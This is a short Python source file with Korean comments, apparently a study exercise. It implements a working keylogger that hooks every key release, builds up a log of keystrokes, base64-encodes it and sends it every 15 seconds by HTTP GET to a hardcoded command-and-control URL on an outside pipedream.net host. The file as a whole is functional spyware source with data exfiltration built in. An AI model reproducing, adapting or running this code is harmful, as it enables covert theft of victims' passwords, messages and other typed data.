import keyboard
from threading import Timer
from base64 import b64encode
# 인코딩 기법 
import requests

C2_URL = "https://eoqg8xdifbxd13l.m.pipedream.net"
#workflow url 복사

class Keylogger:
    def __init__(self, interval):

        self.interval = interval
        self.log =""

    def callback(self, event):
        # key UP is occured
        name = event.name 
        if len(name) > 1:
            name = name.replace(" ", "_")
            name = name.upper()
            name = "[{}]".format(name)

        self.log += name
    #추가된 함수로 log가 쌓이면 서버에 보내는 함수
    def send_server(self):
        leaked_bytes = (self.log).encode("ascii")
        leaked_info = b64encode(leaked_bytes)
        params = {"k":leaked_info}
        res = requests.get(C2_URL,params=params)

    def report(self):
        #보내는 함수를 만들어야한다.
        if self.log != "":
            self.send_server()
        
        self.log = ""

        # This function gets called every `self.interval`
        
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
       

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait() # 계속 돌게끔 제공된 API

    
if __name__ == "__main__":

    keylogger = Keylogger(interval=15)
    keylogger.start()